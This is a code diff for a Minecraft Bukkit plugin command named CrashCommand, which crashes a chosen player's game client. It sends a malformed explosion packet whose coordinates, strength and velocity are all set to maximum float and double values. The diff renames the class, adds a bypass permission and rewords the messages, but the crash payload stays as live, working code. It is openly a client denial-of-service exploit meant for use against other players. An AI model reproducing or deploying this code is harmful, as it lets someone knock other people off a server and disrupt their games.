@@ -12,7 +12,7 @@ import org.bukkit.entity.Player;
 
 import java.util.Collections;
 
-public class CrashPlayer implements CommandExecutor {
+public class CrashCommand implements CommandExecutor {
     @SuppressWarnings("ALL")
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
@@ -23,17 +23,22 @@ public class CrashPlayer implements CommandExecutor {
             }
             if (args.length != 0) {
                 if (Bukkit.getPlayer(args[0]) == null) {
-                    sender.sendMessage(ChatColor.RED + "Invaild player provided");
+                    sender.sendMessage(ChatColor.RED + "That player is not online");
                     return true;
                 }
                 Player target = Bukkit.getPlayer(args[0]);
+                if (target.hasPermission("crash.bypass")) {
+                    sender.sendMessage(ChatColor.RED + "You cannot crash this player!");
+
+                    return true;
+                }
                 ((CraftPlayer) target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(
                         Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,
                         Float.MAX_VALUE, Collections.EMPTY_LIST,
                         new Vec3D(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE)));
-                sender.sendMessage(ChatColor.GREEN + "Crashed " + target);
+                sender.sendMessage(ChatColor.GREEN + "Crashed " + target.getDisplayName());
             } else {
-                sender.sendMessage("Provide a player");
+                sender.sendMessage(ChatColor.RED + "Provide a player");
             }
         }
         return true;
